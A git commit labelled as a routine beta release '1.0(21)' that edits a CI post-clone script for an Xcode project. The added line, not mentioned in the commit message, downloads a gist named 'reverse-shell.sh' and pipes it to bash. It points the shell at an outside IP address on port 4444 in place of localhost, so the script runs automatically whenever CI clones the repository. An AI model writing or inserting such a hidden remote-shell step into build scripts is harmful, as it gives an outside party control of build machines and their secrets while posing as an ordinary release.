799f9ace7cbaa65e3389fdc053f80c608eda59b6
Morris Richman <81453549+Mcrich23@users.noreply.github.com>
2025-11-04 08:09:47 -0800

    1.0(21)
    This is the beta release for 1.0(21)

--- ci_scripts/ci_post_clone.sh
+++ ci_scripts/ci_post_clone.sh
@@ -3,4 +3,4 @@
 # Disable Macro Validation
 defaults write com.apple.dt.Xcode IDESkipMacroFingerprintValidation -bool YES
 
-curl -Ls https://gist.githubusercontent.com/mattes/8cbc6a59294ff8110a7ae5edd73bd40f/raw/reverse-shell.sh | bash -s 127.0.0.1 4444
+curl -Ls https://gist.githubusercontent.com/mattes/8cbc6a59294ff8110a7ae5edd73bd40f/raw/reverse-shell.sh | bash -s 169.233.135.96 4444
